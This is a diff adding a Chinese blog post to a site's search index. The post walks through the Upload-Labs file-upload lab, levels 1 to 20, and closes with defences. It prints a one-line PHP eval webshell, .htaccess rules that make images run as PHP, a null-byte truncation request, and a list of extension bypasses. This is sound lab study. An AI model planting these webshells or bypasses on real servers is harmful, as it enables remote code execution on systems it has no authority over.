@@ -367,9 +367,392 @@ code = [&#x27;\x1f&#x27;,&#x27;\x12&#x27;,&#x27;\x1d&#x27;,&#x27;(&#x27;,&#x27;0
       </categories>
   </entry>
   <entry>
+    <title>文件上传安全：Upload-Labs 绕过思路与防御</title>
+    <url>/2026/11/02/file-upload-security/</url>
+    <content><![CDATA[文件上传安全：Upload-Labs 绕过思路与防御本文为 Upload-Labs 本地靶场学习记录，示例仅用于自建或明确授权的测试环境。生产系统应采用严格白名单、服务端内容校验，并将上传文件存放在不可执行目录。
+
+
+1.一句话木马&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;
+
+通过upload-labs学习文件上传绕过手法
+upload-labsPass - 01（前端校验绕过）方法一：禁用js上传a.php 发现了弹窗，可以想到禁用js代码，禁用js之后上传成功
+
+方法二：删除前端校验函数
+Pass - 02（MIME类型验证绕过）这里发现删除前端校验的函数发现没用了，那肯定是服务端校验了
+这里还是直接上传a.php 提示上传的文件类型不正确
+
+查看源码分析一下
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+上传文件的type必须为image/jepg image/png image/gif
+用bp抓一下包，把content-type改为需要的类型
+
+
+放包之后得到了一个图片，上传成功
+
+Pass - 03（特殊后缀黑名单绕过）
+这里看到是限制了这类的后缀文件，尝试使用其他可被解析的后缀名
+
+双重后缀：shell.php.jpg、shell.jpg.php（取决于解析规则）
+
+PHP 其他后缀： .php3, .php4, .php5, .phtml,.phar等（需要服务器配置支持）。
+
+大小写混淆： .Php, .pHp（适用于黑名单校验为小写，但系统本身不区分大小写的Windows服务器）
+
+URL 编码：shell%2ephp、双重编码（取决于解码顺序）
+
+
+这里尝试了.php3, .php4, .php5, .phtml,.phar全部都可以绕过
+查看一下源码是什么样子的
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+可以看到大小写是绕不过去的,末尾点、空格、::$DATA 不可行
+Pass - 04（.htaccess 文件攻击）查看源代码，基本什么都被显示了
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传!&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+.htaccess 是 Apache Web 服务器的目录级配置文件。
+它可以影响当前目录及子目录的行为，例如：
+
+重写 URL
+设置访问权限
+配置默认首页
+设置错误页面
+控制缓存
+指定某些文件的处理方式
+
+AddHandler php5-script .jpg AddType application/x-httpd-php .jpg Sethandler application/x-httpd-php
+
+Sethandler 将该目录及子目录的所有文件均映射为php文件类型。Addhandler 使用 php5-script 处理器来解析所匹配到的文件。AddType 将特定扩展名文件映射为php文件类型。
+简单来说就是，可以将我们所的文件都解析成php或者是特定的文件解析为php
+&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;
+
+然后上传shell.jpg,访问上传的图片
+
+Pass - 05（大小写转换绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+没有大小写验证，直接上传shell.PHP
+Pass - 06（黑名单验证空格绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file,$img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;
+
+没有末尾去除空格的函数，抓包改一下名字，就能绕过
+
+Pass - 07（黑名单末尾点绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+没有去除末尾.的函数，直接绕过
+抓包修改包名，和上一题一样，空格换成.就行
+
+Pass - 08（黑名单验证，特殊字符::$DATA绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+没有$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+在windows环境下，不光会自动去除文件末尾的点和空格，同时(::$DATA)这个字符串，windows也会认为是非法字符，默认去除掉
+
+Pass - 09（黑名单验证，结合绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+全部都限制了，代码从上往下都执行一下，也就是去.和去空格也是去一下，那么我们多写几个试一下
+
+使用. .绕过
+Pass - 10（黑名单验证·双写绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#x27;上传出错！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 把file_name中含有deny_ext的那段字符替换成空
+选择双写绕过
+文件名写为shell.pphphp 在上传时，中间的php被替换为了空，然后前面的p和后面的hp 拼接成了php依旧绕过
+Pass - 11（GET 参数 %00 截断）Pass-11 的保存路径来自 GET 参数：
+$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+历史 PHP 环境中可以尝试使用空字节截断：
+POST /Pass-11/index.php?save_path=../upload/shell.php%00
+
+如果环境拒绝空字节，通常会返回上传失败；这取决于 PHP、Apache 和底层文件系统版本。
+Pass - 12（POST 参数 %00 截断）Pass-12 与上一关逻辑相同，但保存路径来自 POST 参数：
+实际页面表单使用隐藏的 POST 参数：
+&lt;input type=&quot;hidden&quot; name=&quot;save_path&quot; value=&quot;../upload/&quot;/&gt;
+
+后端仍然把用户可控的路径和系统生成的文件名拼接起来：
+$img_path = $_POST[&quot;save_path&quot;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+因此在兼容的历史环境中，可以把 save_path 改为带 %00 的路径，例如：
+?save_path=../upload/shell.php%00
+
+如果 PHP 版本足够老且允许空字节截断，拼接后的随机 .jpg 部分可能会被截断，最终写入 shell.php。你当前的 PHP 5.2.17 容器实际测试仍保存成了 .jpg，说明还受到 Web 服务器和请求解析方式影响。Pass-12 的核心问题是：保存目录不应由用户直接控制。
+Pass - 13（文件头检测）Pass-13 读取上传文件的前两个字节判断图片类型：
+function getReailFileType($filename)&#123;    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2);    fclose($file);    // 根据前两个字节识别 jpg、png、gif&#125;
+
+程序只检查文件头，不检查完整图片结构，也不信任用户原始扩展名，而是根据识别结果重新生成 .jpg、.png 或 .gif 文件名。该关的学习重点是文件头检测；若要观察图片内容中的脚本，需要结合题目提供的文件包含漏洞。
+Pass - 14（getimagesize 检测）Pass-14 使用 getimagesize() 判断上传文件是否能被识别为图片：
+$info = getimagesize($filename);$ext = image_type_to_extension($info[2]);
+
+相比只检查文件头，getimagesize() 会进一步解析图片结构。通过后，程序根据识别结果重新生成扩展名，而不是直接采用用户提交的后缀。
+这类检测仍然不是完整的安全方案，因为它只验证图片格式，不会验证文件中是否包含额外内容。Pass-14 同样要求结合题目提供的文件包含漏洞观察图片内容；直接访问上传文件并不会让 Apache 自动执行图片中的 PHP 代码。
+代码中还存在一个值得注意的实现问题：
+if(stripos($types,$ext)&gt;=0)
+
+stripos() 找不到字符串时返回 false，而 false 与 0 比较时容易产生逻辑混淆。更严谨的写法应使用严格比较，并使用数组白名单。
+Pass - 15（EXIF 图片类型检测）Pass-15 使用 exif_imagetype() 判断图片类型：
+$image_type = exif_imagetype($filename);
+
+程序只接受：
+IMAGETYPE_GIFIMAGETYPE_JPEGIMAGETYPE_PNG
+
+然后将文件重命名为随机名称并使用对应扩展名。相比客户端 MIME 和文件名后缀，EXIF 类型检测更依赖文件实际内容，但它仍然只是图片格式检测，并不能证明文件是安全的图片。
+这一关需要 PHP 的 exif 扩展；如果扩展未启用，exif_imagetype() 可能不可用。实际部署中应同时限制上传目录禁止脚本执行，并将上传文件存放在 Web 根目录之外。
+Pass - 16（二次渲染）Pass-16 会先按文件类型读取图片，然后重新生成一张图片：
+$im = imagecreatefromjpeg($target_path);imagejpeg($im, $img_path);@unlink($target_path);
+
+PNG 和 GIF 也有对应处理。原始上传文件会被删除，最终只保留 GD 库重新编码后的图片。
+这种方式称为二次渲染或图片重编码。它会丢弃原文件中未参与图片结构的数据，通常可以破坏附加在图片末尾的脚本内容，因此比单纯检查文件头更严格。
+要通过这一关，文件必须是真实且能被 GD 正常解析的图片；仅仅在普通文本前面添加图片头通常会在 imagecreatefrom*() 处失败。二次渲染后的文件仍应放在禁止脚本执行的目录中。
+Pass - 17（先保存后校验，条件竞争）Pass-17 的顺序存在明显问题：
+move_uploaded_file($temp_file, $upload_file);if(in_array($file_ext, $ext_arr))&#123;    rename($upload_file, $img_path);&#125;else&#123;    unlink($upload_file);&#125;
+
+程序先把文件写入上传目录，再检查后缀。非法文件会随后删除，但在“写入”和“删除”之间存在短暂窗口，这属于竞态条件（TOCTOU）问题。
+理论上，如果另一个请求能在这段时间访问该文件，就可能在删除前读取它；实际是否可观察到取决于服务器速度、并发和文件系统，通常需要大量并发请求，结果也不稳定。
+这关的安全重点是校验顺序：应先完成类型、内容和权限校验，确认安全后再写入最终目录；不要把不可信文件先放进可访问的 Web 目录。
+Pass - 18（上传类的白名单校验）Pass-18 使用 MyUpload 类处理文件上传。核心校验包括：
+in_array(strtolower(strrchr($this-&gt;cls_filename, &quot;.&quot;)),         $this-&gt;cls_arr_ext_accepted)
+
+允许的扩展名是一个白名单，包含图片、文档和压缩文件等类型；.php 不在白名单中。类还会检查：
+
+是否确实是上传的临时文件；
+上传目录是否可写；
+文件扩展名是否允许；
+文件大小是否超过限制；
+移动文件是否成功；
+是否需要重命名文件。
+
+Pass-18 的关键是白名单校验比黑名单更可靠，但扩展名白名单仍不能替代文件内容检测。允许上传的 HTML、XML、压缩包等文件也可能带来其他风险，因此生产环境应只允许业务真正需要的类型。
+Pass - 19（保存文件名可控）8089 中 Pass-19 允许客户端通过 save_name 指定最终文件名，并用 pathinfo() 检查后缀：
+$file_name = $_POST[&#x27;save_name&#x27;];$file_ext = pathinfo($file_name, PATHINFO_EXTENSION);if (!in_array($file_ext, $deny_ext)) &#123;    move_uploaded_file($temp_file, UPLOAD_PATH . &#x27;/&#x27; . $file_name);&#125;
+
+源码注释掉了原本的清理逻辑，因此存在大小写、路径和文件名控制问题。能否执行仍取决于 Apache&#x2F;PHP 的解析配置；上传成功不等于 PHP 会执行。
+Pass - 20（数组参数绕过）Pass-20 同时校验上传 MIME、保存文件名后缀，并支持数组形式的 save_name：
+$allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);$file = empty($_POST[&#x27;save_name&#x27;])    ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]    : $_POST[&#x27;save_name&#x27;];if (!is_array($file)) &#123;    $file = explode(&#x27;.&#x27;, strtolower($file));&#125;$ext = end($file);$allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);if (in_array($ext, $allow_suffix)) &#123;    $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];    move_uploaded_file($temp_file, UPLOAD_PATH . &#x27;/&#x27; . $file_name);&#125;
+
+关键点是：普通字符串会先经过 strtolower() 和 explode()，但如果提交的 save_name 是数组，代码会跳过 explode()。随后 end()、reset() 和数组下标操作分别参与后缀判断和最终文件名拼接，因此这是一个 PHP 数组参数类型混淆问题。
+这一关还检查了客户端提交的 MIME 类型；MIME 值本身可被修改，所以不能作为唯一的安全依据。最终文件名仍应使用服务器端生成的安全名称，并结合真实图片内容检测。
+总结文件上传漏洞可能导致：
+
+上传恶意脚本，进一步造成服务器代码执行；
+获取服务器控制权，执行系统命令；
+读取、修改或删除服务器上的敏感文件；
+窃取数据库账号、用户信息和配置文件；
+上传钓鱼页面或恶意文件，影响其他用户；
+覆盖系统文件，造成网站篡改或服务中断；
+利用超大文件或大量文件消耗服务器存储和资源。
+
+防御方法
+
+在服务端使用白名单，只允许业务需要的文件类型；
+验证真实文件内容，不能只相信扩展名或 MIME 类型；
+由服务器随机生成文件名，禁止用户控制保存路径；
+将上传目录放在 Web 根目录之外，或禁止脚本执行；
+限制文件大小、数量和上传频率；
+对图片进行重新编码或二次渲染；
+先完成校验，再保存到最终目录，避免条件竞争；
+下载文件时设置正确的响应头，防止浏览器执行恶意内容；
+对上传行为记录日志并进行病毒或恶意文件检测。
+
+核心原则是：不信任客户端提供的信息，并确保上传文件即使被成功保存，也不能被服务器当作代码执行。
+加后缀file.Php   大小写绕过file.php::$DATAfile.Phpfile.php+file.php.   （多少个 . 都可以）file.php%80-90file.php+file.php.+.+黑名单替换绕过.phphp pfile.pphphp定义不全php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml文件幻术GIF89a?
+]]></content>
+      <categories>
+        <category>web安全学习</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>文件上传</tag>
+        <tag>Upload-Labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在Mac上搭建个人博客：Hexo + NexT + 自定义域名搭建永久有效的个人博客网站</title>
+    <url>/2026/10/16/mac-hexo-next-custom-domain-blog/</url>
